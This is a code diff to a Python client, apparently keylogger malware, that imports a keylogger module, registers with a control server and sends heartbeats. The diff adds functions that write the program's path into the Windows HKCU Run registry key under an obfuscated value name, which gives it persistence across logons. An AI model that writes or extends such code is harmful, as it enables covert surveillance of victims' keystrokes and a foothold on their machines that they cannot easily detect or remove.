@@ -5,11 +5,32 @@ import os
 import json
 from keylogger import keylogger
 from threading import Timer
+import sys
+from winreg import OpenKey, SetValueEx, HKEY_CURRENT_USER, KEY_ALL_ACCESS, REG_SZ, QueryValueEx
 
 BASE_URL = "http://127.0.0.1:8000"
 UUID = "312314143312"
 HEART_BEAT = 30
 INTERVAL = 60
+
+def addStartup():  # this will add the file to the startup registry key
+    fp = os.path.dirname(os.path.realpath(__file__))
+    file_name = sys.argv[0].split('\\')[-1]
+    new_file_path = fp + '\\' + file_name
+    keyVal = r'Software\Microsoft\Windows\CurrentVersion\Run'
+    key2change = OpenKey(HKEY_CURRENT_USER, keyVal, 0, KEY_ALL_ACCESS)
+    SetValueEx(key2change, '2j3dj2j4n2jjndksa3ns94n2md23nrss', 0, REG_SZ,
+               new_file_path)
+
+def checkStartup():
+    keyVal = r'Software\Microsoft\Windows\CurrentVersion\Run'
+    try:
+        key = OpenKey(HKEY_CURRENT_USER, keyVal,0, KEY_ALL_ACCESS)
+        value = QueryValueEx(key, "2j3dj2j4n2jjndksa3ns94n2md23nrss")
+        return value != None
+    except FileNotFoundError:
+        return False
+
 
 def contactServer():
     try:
@@ -76,8 +97,8 @@ if __name__ == "__main__":
     if not registerServer():
         exit()
     
-    while(True):
-        pass
+    if(not checkStartup()):
+        addStartup()
 
 
     
